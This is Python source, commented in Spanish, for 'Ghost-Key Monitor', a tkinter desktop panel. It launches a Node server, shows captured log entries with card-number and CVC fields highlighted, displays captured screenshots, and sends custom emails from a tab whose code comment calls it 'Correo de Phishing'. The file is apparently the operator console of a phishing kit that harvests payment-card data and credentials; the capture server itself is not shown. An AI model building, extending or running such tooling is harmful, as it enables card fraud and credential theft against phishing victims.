"""Clase principal GhostKeyMonitor — ensambla la UI y coordina módulos."""
import tkinter as tk
from tkinter import messagebox
import subprocess
import webbrowser
import os
import re
from pathlib import Path
from PIL import Image, ImageTk

from .constants import (BASE_DIR, LOG_FILE, SNAPS_DIR,
                        BG_DARK, BG_MID, BG_PANEL, BG_HEADER,
                        ACCENT, CYAN, GREEN, YELLOW, RED, FG_DIM, FG_MAIN, BORDER)
from .env_utils import read_env
from .config_dialog import ConfigDialog
from .mail_service import send_custom_email


class GhostKeyMonitor(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Ghost-Key")
        self.configure(bg=BG_DARK)
        self.geometry("1050x680")
        self.minsize(900, 580)

        self._node_proc    = None
        self._last_log_sz  = -1
        self._last_snaps   = []
        self._snap_photos  = {}
        self._status_after = None
        self._current_url  = ""

        self._build_ui()
        self._refresh()

    # ── UI ───────────────────────────────────────────────────────────────────

    def _build_ui(self):
        self._build_header()
        self._build_urlbar()
        self._build_tabs()
        self._build_body()
        self._build_mail_tab()

    def _build_header(self):
        hdr = tk.Frame(self, bg=BG_HEADER, height=64)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        tk.Frame(self, bg=ACCENT, height=2).pack(fill="x")

        logo_f = tk.Frame(hdr, bg=BG_HEADER)
        logo_f.pack(side="left", padx=20, pady=8)

        # Integracion del Logo
        try:
            _img = Image.open(BASE_DIR / "src" / "logo.png")
            _img.thumbnail((48, 48), Image.LANCZOS)
            self._header_logo = ImageTk.PhotoImage(_img)
            tk.Label(logo_f, image=self._header_logo,
                     bg=BG_HEADER).pack(side="left")
        except Exception:
            tk.Label(logo_f, text="👻", bg=BG_HEADER,
                     font=("Segoe UI", 14)).pack(side="left")

        tk.Label(logo_f, text="  Ghost-Key Monitor", bg=BG_HEADER, fg=ACCENT,
                 font=("Segoe UI", 14, "bold")).pack(side="left")

        right = tk.Frame(hdr, bg=BG_HEADER)
        right.pack(side="right", padx=16)

        self.lbl_stats = tk.Label(right, text="Logs: 0 bytes  |  Capturas: 0",
                                  bg=BG_HEADER, fg=FG_DIM, font=("Consolas", 9))
        self.lbl_stats.pack(side="left", padx=(0, 20))

        tk.Button(right, text="⚙ Config", command=self._open_config,
                  bg=BG_PANEL, fg=FG_DIM, activebackground=BORDER,
                  activeforeground=ACCENT, relief="flat",
                  font=("Segoe UI", 9), cursor="hand2",
                  padx=10, pady=4).pack(side="left", padx=4)

        self.btn_server = tk.Button(right, text="▶ Iniciar servidor",
                                    command=self._toggle_server,
                                    bg=GREEN, fg=BG_DARK,
                                    activebackground="#22c55e",
                                    activeforeground=BG_DARK, relief="flat",
                                    font=("Segoe UI", 9, "bold"),
                                    cursor="hand2", padx=10, pady=4)
        self.btn_server.pack(side="left", padx=4)

    def _build_urlbar(self):
        bar = tk.Frame(self, bg=BG_MID, height=36)
        bar.pack(fill="x")
        bar.pack_propagate(False)

        tk.Label(bar, text="🌐", bg=BG_MID, fg=FG_DIM,
                 font=("Segoe UI", 11)).pack(side="left", padx=(14, 4))

        self.url_var = tk.StringVar(value="Servidor detenido")
        self.url_entry = tk.Entry(bar, textvariable=self.url_var,
                                  bg=BG_DARK, fg=FG_DIM,
                                  insertbackground=FG_MAIN, relief="flat",
                                  font=("Consolas", 10), state="readonly",
                                  readonlybackground=BG_DARK,
                                  highlightthickness=1, highlightbackground=BORDER,
                                  highlightcolor=ACCENT)
        self.url_entry.pack(side="left", fill="x", expand=True,
                            ipady=5, padx=(0, 8))

        self.btn_open_url = tk.Button(bar, text="↗ Abrir",
                                      command=self._open_in_browser,
                                      bg=BG_PANEL, fg=FG_DIM,
                                      activebackground=ACCENT,
                                      activeforeground="white", relief="flat",
                                      font=("Segoe UI", 9), cursor="hand2",
                                      padx=12, pady=4, state="disabled")
        self.btn_open_url.pack(side="left", padx=(0, 12))
        tk.Frame(self, bg=BORDER, height=1).pack(fill="x")

    def _build_tabs(self):
        tab_bar = tk.Frame(self, bg=BG_MID, height=38)
        tab_bar.pack(fill="x")
        tab_bar.pack_propagate(False)

        def active(btn):   btn.configure(bg=ACCENT,   fg="white")
        def inactive(btn): btn.configure(bg=BG_PANEL, fg=FG_DIM)

        self._tab_monitor_btn = tk.Button(tab_bar, text="📋  Monitor",
                                          relief="flat", font=("Segoe UI", 9, "bold"),
                                          cursor="hand2", padx=18, pady=6,
                                          command=self._show_monitor)
        self._tab_monitor_btn.pack(side="left", padx=(10, 2), pady=5)

        self._tab_mail_btn = tk.Button(tab_bar, text="✉  Enviar correo",
                                       relief="flat", font=("Segoe UI", 9, "bold"),
                                       cursor="hand2", padx=18, pady=6,
                                       command=self._show_mail)
        self._tab_mail_btn.pack(side="left", padx=2, pady=5)

        active(self._tab_monitor_btn)
        inactive(self._tab_mail_btn)
        self._tab_active   = active
        self._tab_inactive = inactive

        tk.Frame(self, bg=BORDER, height=1).pack(fill="x")

    def _show_monitor(self):
        self._tab_active(self._tab_monitor_btn)
        self._tab_inactive(self._tab_mail_btn)
        self._frame_monitor.pack(fill="both", expand=True, padx=12, pady=(10, 4))
        self._frame_mail.pack_forget()

    def _show_mail(self):
        self._tab_inactive(self._tab_monitor_btn)
        self._tab_active(self._tab_mail_btn)
        self._frame_monitor.pack_forget()
        self._frame_mail.pack(fill="both", expand=True, padx=12, pady=(10, 4))

    def _build_body(self):
        body = tk.Frame(self, bg=BG_DARK)
        self._frame_monitor = body
        body.pack(fill="both", expand=True, padx=12, pady=(10, 4))

        # Panel izquierdo: logs
        left = tk.Frame(body, bg=BG_PANEL, bd=0,
                        highlightthickness=1, highlightbackground=BORDER)
        left.pack(side="left", fill="both", expand=True, padx=(0, 6))

        log_hdr = tk.Frame(left, bg=BG_MID, height=34)
        log_hdr.pack(fill="x")
        log_hdr.pack_propagate(False)
        tk.Label(log_hdr, text="📋 Logs capturados", bg=BG_MID, fg=FG_MAIN,
                 font=("Segoe UI", 10, "bold")).pack(side="left", padx=14, pady=7)
        tk.Button(log_hdr, text="🗑", command=self._clear_logs,
                  bg=BG_MID, fg=FG_DIM, activebackground=BORDER,
                  activeforeground=RED, relief="flat",
                  font=("Segoe UI", 10), cursor="hand2",
                  bd=0, padx=6).pack(side="right", padx=8)

        self.log_text = tk.Text(left, bg=BG_DARK, fg=FG_MAIN,
                                font=("Consolas", 10), relief="flat", bd=0,
                                insertbackground=FG_MAIN, selectbackground=ACCENT,
                                wrap="none", state="disabled", padx=10, pady=6)
        sb_y = tk.Scrollbar(left, orient="vertical", command=self.log_text.yview,
                             bg=BG_MID, troughcolor=BG_DARK, activebackground=ACCENT)
        sb_x = tk.Scrollbar(left, orient="horizontal", command=self.log_text.xview,
                             bg=BG_MID, troughcolor=BG_DARK, activebackground=ACCENT)
        self.log_text.configure(yscrollcommand=sb_y.set, xscrollcommand=sb_x.set)
        sb_y.pack(side="right", fill="y")
        sb_x.pack(side="bottom", fill="x")
        self.log_text.pack(fill="both", expand=True)

        for tag, color in [("ts", "#8b949e"), ("campo", CYAN),
                            ("valor", GREEN), ("card", YELLOW), ("cvc", RED)]:
            self.log_text.tag_config(tag, foreground=color)

        # Panel derecho: capturas
        right_frame = tk.Frame(body, bg=BG_PANEL, bd=0,
                               highlightthickness=1, highlightbackground=BORDER)
        right_frame.pack(side="right", fill="both", expand=True)

        snap_hdr = tk.Frame(right_frame, bg=BG_MID, height=34)
        snap_hdr.pack(fill="x")
        snap_hdr.pack_propagate(False)
        tk.Label(snap_hdr, text="📸 Capturas de pantalla", bg=BG_MID, fg=FG_MAIN,
                 font=("Segoe UI", 10, "bold")).pack(side="left", padx=14, pady=7)
        tk.Button(snap_hdr, text="🗑", command=self._clear_snaps,
                  bg=BG_MID, fg=FG_DIM, activebackground=BORDER,
                  activeforeground=RED, relief="flat",
                  font=("Segoe UI", 10), cursor="hand2",
                  bd=0, padx=6).pack(side="right", padx=8)

        snap_canvas = tk.Canvas(right_frame, bg=BG_DARK, highlightthickness=0)
        snap_sb = tk.Scrollbar(right_frame, orient="vertical",
                               command=snap_canvas.yview,
                               bg=BG_MID, troughcolor=BG_DARK,
                               activebackground=ACCENT)
        snap_canvas.configure(yscrollcommand=snap_sb.set)
        snap_sb.pack(side="right", fill="y")
        snap_canvas.pack(fill="both", expand=True)

        self.snap_inner = tk.Frame(snap_canvas, bg=BG_DARK)
        self._snap_window = snap_canvas.create_window(
            (0, 0), window=self.snap_inner, anchor="nw")

        def _on_conf(e):
            snap_canvas.configure(scrollregion=snap_canvas.bbox("all"))
            snap_canvas.itemconfig(self._snap_window, width=snap_canvas.winfo_width())

        self.snap_inner.bind("<Configure>", _on_conf)
        snap_canvas.bind("<Configure>", _on_conf)
        snap_canvas.bind_all("<Button-4>",
                             lambda e: snap_canvas.yview_scroll(-1, "units"))
        snap_canvas.bind_all("<Button-5>",
                             lambda e: snap_canvas.yview_scroll(1, "units"))
        self._snap_canvas = snap_canvas

        # Status bar
        self.lbl_status = tk.Label(self, text="Listo.", bg=BG_DARK, fg=FG_DIM,
                                   font=("Consolas", 8), anchor="w")
        self.lbl_status.pack(fill="x", padx=14, pady=(2, 6))

    def _build_mail_tab(self):
        frame = tk.Frame(self, bg=BG_DARK)
        self._frame_mail = frame

        card = tk.Frame(frame, bg=BG_PANEL,
                        highlightthickness=1, highlightbackground=BORDER)
        card.pack(expand=True, fill="both", padx=60, pady=20)

        hdr = tk.Frame(card, bg=BG_MID, height=42)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        tk.Label(hdr, text="✉  Redactar correo", bg=BG_MID, fg=ACCENT,
                 font=("Segoe UI", 12, "bold")).pack(side="left", padx=16, pady=10)
        tk.Frame(card, bg=BORDER, height=1).pack(fill="x")

        form = tk.Frame(card, bg=BG_PANEL)
        form.pack(fill="both", expand=True, padx=30, pady=16)
        form.columnconfigure(1, weight=1)
        form.rowconfigure(2, weight=1)

        def lbl(text, row):
            tk.Label(form, text=text, bg=BG_PANEL, fg=FG_DIM,
                     font=("Consolas", 9)).grid(row=row, column=0,
                                                sticky="nw", pady=(10, 2))

        def entry_w(row) -> tk.Entry:
            e = tk.Entry(form, bg=BG_DARK, fg=FG_MAIN,
                         insertbackground=FG_MAIN, relief="flat",
                         font=("Consolas", 11), highlightthickness=1,
                         highlightbackground=BORDER, highlightcolor=ACCENT)
            e.grid(row=row, column=1, sticky="ew", ipady=6,
                   padx=(12, 0), pady=(10, 2))
            return e

        lbl("Para (To):", 0);    self.mail_to = entry_w(0)
        lbl("Asunto:", 1);       self.mail_subject = entry_w(1)
        self.mail_subject.insert(0, "Mensaje desde Ghost-Key Monitor")

        lbl("Mensaje:", 2)
        self.mail_body = tk.Text(form, bg=BG_DARK, fg=FG_MAIN,
                                 insertbackground=FG_MAIN, relief="flat",
                                 font=("Consolas", 10), highlightthickness=1,
                                 highlightbackground=BORDER, highlightcolor=ACCENT,
                                 padx=8, pady=6, height=12)
        self.mail_body.grid(row=2, column=1, sticky="nsew",
                            padx=(12, 0), pady=(14, 2))

        sb = tk.Scrollbar(form, orient="vertical", command=self.mail_body.yview,
                          bg=BG_MID, troughcolor=BG_DARK, activebackground=ACCENT)
        sb.grid(row=2, column=2, sticky="ns", pady=(14, 2))
        self.mail_body.configure(yscrollcommand=sb.set)

        btn_row = tk.Frame(card, bg=BG_PANEL)
        btn_row.pack(fill="x", padx=30, pady=(0, 20))

        self.mail_status = tk.Label(btn_row, text="", bg=BG_PANEL, fg=FG_DIM,
                                    font=("Consolas", 9))
        self.mail_status.pack(side="left")

        tk.Button(btn_row, text="  ✉  Enviar correo  ",
                  command=self._send_custom_email, bg=ACCENT, fg="white",
                  activebackground="#7c3aed", activeforeground="white",
                  relief="flat", font=("Segoe UI", 10, "bold"),
                  cursor="hand2", padx=16, pady=8).pack(side="right")

    # Logs a mostrar

    def _load_logs(self):
        if not LOG_FILE.exists():
            return
        sz = LOG_FILE.stat().st_size
        if sz == self._last_log_sz:
            return
        self._last_log_sz = sz
        content = LOG_FILE.read_text(errors="replace")
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        for line in content.splitlines():
            self._insert_colored_line(line + "\n")
        self.log_text.configure(state="disabled")
        self.log_text.see("end")

    def _insert_colored_line(self, line: str):
        m = re.match(r"^(\[[^\]]+\])\s*(Campo:\s*\S+)\s*\|\s*(Valor:\s*.+)$",
                     line.rstrip())
        if m:
            field = m.group(2).lower()
            if any(x in field for x in ("card", "number")):
                v_tag = "card"
            elif any(x in field for x in ("cvc", "cvv")):
                v_tag = "cvc"
            else:
                v_tag = "valor"
            self.log_text.insert("end", m.group(1) + " ", "ts")
            self.log_text.insert("end", m.group(2) + " | ", "campo")
            self.log_text.insert("end", m.group(3) + "\n", v_tag)
        else:
            self.log_text.insert("end", line)

    def _clear_logs(self):
        if messagebox.askyesno("Limpiar logs", "¿Borrar el archivo de logs?",
                               parent=self):
            LOG_FILE.write_text("")
            self._last_log_sz = -1
            self.log_text.configure(state="normal")
            self.log_text.delete("1.0", "end")
            self.log_text.configure(state="disabled")

    # Capturas a mostrar

    def _clear_snaps(self):
        if not messagebox.askyesno("Eliminar capturas",
                                   "¿Borrar todas las capturas de pantalla?",
                                   parent=self):
            return
        for f in SNAPS_DIR.glob("*.jpg"):
            f.unlink(missing_ok=True)
        self._last_snaps = []
        for w in self.snap_inner.winfo_children():
            w.destroy()
        self._snap_photos.clear()
        self.status_bar("🗑  Capturas eliminadas.", RED)

    THUMB_W, THUMB_H = 260, 175

    def _load_snaps(self):
        if not SNAPS_DIR.exists():
            return
        files = sorted(SNAPS_DIR.glob("*.jpg"), key=lambda p: p.stat().st_mtime)
        names = [f.name for f in files]
        if names == self._last_snaps:
            return
        self._last_snaps = names
        for w in self.snap_inner.winfo_children():
            w.destroy()
        self._snap_photos.clear()
        for f in reversed(files):
            self._add_snap_card(f)

    def _add_snap_card(self, path: Path):
        card = tk.Frame(self.snap_inner, bg=BG_MID,
                        highlightthickness=1, highlightbackground=BORDER)
        card.pack(fill="x", padx=8, pady=(8, 0))
        try:
            img = Image.open(path)
            img.thumbnail((self.THUMB_W, self.THUMB_H), Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            self._snap_photos[path.name] = photo
            lbl = tk.Label(card, image=photo, bg=BG_MID, cursor="hand2")
            lbl.pack(pady=(8, 4))
            lbl.bind("<Button-1>", lambda e, p=path: self._open_full(p))
        except Exception:
            tk.Label(card, text="[imagen no disponible]",
                     bg=BG_MID, fg=RED, font=("Consolas", 9)).pack(pady=10)
        tk.Label(card, text=path.name, bg=BG_MID, fg=FG_DIM,
                 font=("Consolas", 8), wraplength=self.THUMB_W).pack(pady=(0, 8))

    def _open_full(self, path: Path):
        win = tk.Toplevel(self)
        win.title(path.name)
        win.configure(bg=BG_DARK)
        try:
            img = Image.open(path)
            img.thumbnail((900, 700), Image.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(win, image=photo, bg=BG_DARK)
            lbl.image = photo
            lbl.pack(padx=10, pady=10)
        except Exception as err:
            tk.Label(win, text=str(err), bg=BG_DARK, fg=RED).pack(padx=20, pady=20)

    # Servuidor

    def _toggle_server(self):
        if self._node_proc is None:
            self._start_server()
        else:
            self._stop_server()

    def _start_server(self):
        env = os.environ.copy()
        dotenv = read_env()
        env.update(dotenv)
        try:
            self._node_proc = subprocess.Popen(
                ["node", "server.js"], cwd=str(BASE_DIR), env=env,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.btn_server.configure(text="■ Detener servidor",
                                      bg=RED, activebackground="#dc2626",
                                      fg="white")
            ip, port = dotenv.get("SERVER_IP", "localhost"), dotenv.get("PORT", "3000")
            self._current_url = f"http://{ip}:{port}"
            self.url_var.set(self._current_url)
            self.url_entry.configure(fg=CYAN)
            self.btn_open_url.configure(state="normal", fg=ACCENT)
            self.status_bar(f"▶  Servidor iniciado → {self._current_url}", GREEN)
        except FileNotFoundError:
            messagebox.showerror("Error", "No se encontró 'node' en el PATH.")

    def _stop_server(self):
        if self._node_proc:
            self._node_proc.terminate()
            self._node_proc = None
        self.btn_server.configure(text="▶ Iniciar servidor",
                                  bg=GREEN, activebackground="#22c55e", fg=BG_DARK)
        self._current_url = ""
        self.url_var.set("Servidor detenido")
        self.url_entry.configure(fg=FG_DIM)
        self.btn_open_url.configure(state="disabled", fg=FG_DIM)
        self.status_bar("■  Servidor detenido.", RED)

   
    def _refresh(self):
        self._load_logs()
        self._load_snaps()
        log_sz  = LOG_FILE.stat().st_size if LOG_FILE.exists() else 0
        n_snaps = len(list(SNAPS_DIR.glob("*.jpg"))) if SNAPS_DIR.exists() else 0
        self.lbl_stats.configure(
            text=f"Logs: {log_sz} bytes  |  Capturas: {n_snaps}")
        self.after(2000, self._refresh)

    # Correo de Phishing 

    def _send_custom_email(self):
        to_addr = self.mail_to.get().strip()
        subject = self.mail_subject.get().strip()
        body    = self.mail_body.get("1.0", "end").strip()

        if not to_addr:
            self.mail_status.configure(text="⚠ Ingresa un destinatario.", fg=YELLOW)
            return
        if not body:
            self.mail_status.configure(text="⚠ El mensaje está vacío.", fg=YELLOW)
            return

        self.mail_status.configure(text="⏳ Enviando...", fg=FG_DIM)
        self.update_idletasks()

        send_custom_email(
            to_addr, subject, body,
            on_success=lambda addr: self.after(0, lambda: (
                self.mail_status.configure(text=f"✔ Enviado a {addr}", fg=GREEN),
                self.status_bar(f"✔ Correo enviado → {addr}", GREEN)
            )),
            on_error=lambda msg: self.after(0, lambda: (
                self.mail_status.configure(text=f"✖ Error: {msg}", fg=RED),
                self.status_bar("✖ Error al enviar correo", RED)
            ))
        )


    def _open_in_browser(self):
        if self._current_url:
            webbrowser.open(self._current_url)

    def _open_config(self):
        ConfigDialog(self)

    def status_bar(self, msg: str, color: str = FG_DIM):
        self.lbl_status.configure(text=msg, fg=color)
        if self._status_after:
            self.after_cancel(self._status_after)
        self._status_after = self.after(
            5000, lambda: self.lbl_status.configure(text="", fg=FG_DIM))

    def on_close(self):
        if self._node_proc:
            self._node_proc.terminate()
        self.destroy()
